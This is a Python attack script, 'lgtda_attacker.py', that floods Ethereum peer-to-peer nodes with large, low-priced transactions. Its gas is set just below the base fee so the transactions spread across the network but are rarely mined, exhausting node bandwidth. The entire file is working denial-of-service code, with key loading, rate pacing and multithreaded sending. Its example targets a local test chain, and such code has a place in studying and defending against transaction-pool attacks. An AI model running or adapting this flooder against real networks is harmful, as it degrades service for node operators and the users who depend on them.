# lgtda_attacker.py
# ------------------------------------------------------------
# LGTDA-style bandwidth exhaustion attacker for Ethereum P2P
# Sends large, low-gas-price transactions at high rate using
# multiple EOAs to saturate node bandwidth without inclusion.
#
# Usage (example):
#   python lgtda_attacker.py --rpc http://127.0.0.1:8545 --chain-id 1337 \
#       --keys keys.txt --tps 400 --duration 60 --data-bytes 120000 --mode eoatx
#
# keys.txt should contain one hex private key per line (without 0x).
# ------------------------------------------------------------
import argparse
import sys
import time
import math
import threading
from queue import Queue
from pathlib import Path
from typing import List, Tuple
from web3 import Web3
from eth_account import Account
from eth_account.signers.local import LocalAccount
from web3.middleware import geth_poa_middleware

HEX_PREFIX = "0x"

def load_keys(path: str) -> List[LocalAccount]:
    p = Path(path)
    if not p.exists():
        print(f"[!] keys file not found: {path}")
        sys.exit(1)
    accounts = []
    for line in p.read_text().splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("0x"):
            line = line[2:]
        try:
            acct = Account.from_key(bytes.fromhex(line))
        except Exception as e:
            print(f"[!] failed to parse key: {e}")
            sys.exit(1)
        accounts.append(acct)
    if not accounts:
        print("[!] no keys loaded")
        sys.exit(1)
    return accounts

def build_payload_bytes(length: int, selector: bytes = None) -> bytes:
    # Fill with zeros, optionally prefix with a 4-byte function selector
    if length <= 0:
        return b""
    if selector:
        if len(selector) != 4:
            raise ValueError("selector must be 4 bytes")
        if length < 4:
            raise ValueError("length must be >= 4 when selector is provided")
        return selector + b"\x00" * (length - 4)
    return b"\x00" * length

def pick_level_b_gas(w3: Web3) -> Tuple[int, int]:
    """Return (max_fee_per_gas, max_priority_fee_per_gas) in wei.
    Try to pick Level B: >= 1 gwei (txpool price) but < base fee,
    so it's broadcast but unlikely included.
    If base fee <= 1 gwei, fall back to exactly 1 gwei (may be Level A in some configs).
    """
    latest = w3.eth.get_block('latest')
    base = latest.get('baseFeePerGas', None)
    gwei = 10**9
    tip = 1 * gwei  # minimal priority to satisfy txpool price check
    if base is None:
        # Pre-EIP-1559 chain: use legacy gasPrice = 1 gwei
        return (1 * gwei, 0)
    # Aim for just under base fee but >= 1 gwei
    if base > 2 * gwei:
        max_fee = int(base - 1 * gwei)
    else:
        max_fee = 1 * gwei
    # Ensure max_fee >= tip for EIP-1559 validity
    if max_fee <= tip:
        tip = max(0, max_fee - 1)
    return (max_fee, tip)

def next_nonce(w3: Web3, addr: str) -> int:
    return w3.eth.get_transaction_count(addr, 'pending')

def round_robin(items):
    while True:
        for it in items:
            yield it

def worker_send(w3: Web3, jobq: Queue):
    while True:
        job = jobq.get()
        if job is None:
            break
        try:
            (acct, to_addr, payload, chain_id) = job
            max_fee, tip = pick_level_b_gas(w3)
            # Prefer type-2 (EIP-1559) if base fee present
            tx = {
                'type': 2,
                'chainId': chain_id,
                'nonce': next_nonce(w3, acct.address),
                'to': to_addr,
                'value': 0,
                'data': payload,
                'maxFeePerGas': max_fee,
                'maxPriorityFeePerGas': tip,
                'gas': 21000 + len(payload) * 4 + 50000,  # rough upper bound; node will cap
            }
            signed = acct.sign_transaction(tx)
            txh = w3.eth.send_raw_transaction(signed.rawTransaction)
            time.sleep(0.001)
        except Exception as e:
            # Best-effort flooding; log and continue
            print(f"[send err] {e}")
        finally:
            jobq.task_done()

def main():
    ap = argparse.ArgumentParser(description='LGTDA-style attacker')
    ap.add_argument('--rpc', required=True, help='RPC URL (e.g., http://127.0.0.1:8545)')
    ap.add_argument('--chain-id', type=int, required=True, help='Chain ID (e.g., 1337)')
    ap.add_argument('--keys', required=True, help='Path to file with one private key per line (hex)')
    ap.add_argument('--tps', type=int, default=200, help='Target transactions per second')
    ap.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    ap.add_argument('--data-bytes', type=int, default=120000, help='Bytes in data payload (<= 128*1024)')
    ap.add_argument('--mode', choices=['eoatx', 'contract'], default='eoatx', help='eoatx: send to EOA; contract: call selector 0x00000000')
    ap.add_argument('--to', help='Override destination address (EOA or contract)')
    ap.add_argument('--threads', type=int, default=8, help='Sender threads')
    args = ap.parse_args()

    if args.data_bytes > 128*1024:
        print('[!] data-bytes must be <= 131072 (128 KiB)'); sys.exit(1)

    w3 = Web3(Web3.HTTPProvider(args.rpc))
    if not w3.is_connected():
        print('[!] cannot connect to RPC'); sys.exit(1)
    w3.middleware_onion.inject(geth_poa_middleware, layer=0)

    accts = load_keys(args.keys)
    # Destination address: by default, use the first account as sink
    if args.to:
        to_addr = Web3.to_checksum_address(args.to)
    else:
        to_addr = Web3.to_checksum_address(accts[0].address)
    # Payload
    selector = b"\x00\x00\x00\x00" if args.mode == 'contract' else None
    payload = build_payload_bytes(args.data_bytes, selector)
    print(f"[i] Using {len(accts)} EOAs; to={to_addr}; payload={len(payload)} bytes; tps={args.tps}; duration={args.duration}s")
    # Prepare workers
    jobq = Queue(maxsize=args.tps * 2)
    workers = []
    for _ in range(max(1, args.threads)):
        t = threading.Thread(target=worker_send, args=(w3, jobq), daemon=True)
        t.start()
        workers.append(t)
    rr = round_robin(accts)
    # Rate control loop
    total = args.tps * args.duration
    start = time.perf_counter()
    sent = 0
    for i in range(total):
        now = time.perf_counter()
        elapsed = now - start
        # Pace to TPS
        target_elapsed = (i+1) / max(1, args.tps)
        if elapsed < target_elapsed:
            time.sleep(target_elapsed - elapsed)
        acct = next(rr)
        jobq.put((acct, to_addr, payload, args.chain_id))
        sent += 1
        if i and i % args.tps == 0:
            print(f"[i] queued {i} / {total}")
    jobq.join()
    dur = time.perf_counter() - start
    print(f"[done] queued={sent}, duration={dur:.2f}s")
    # Stop workers
    for _ in workers:
        jobq.put(None)
    for t in workers:
        t.join(timeout=1)
if __name__ == '__main__':
    main()
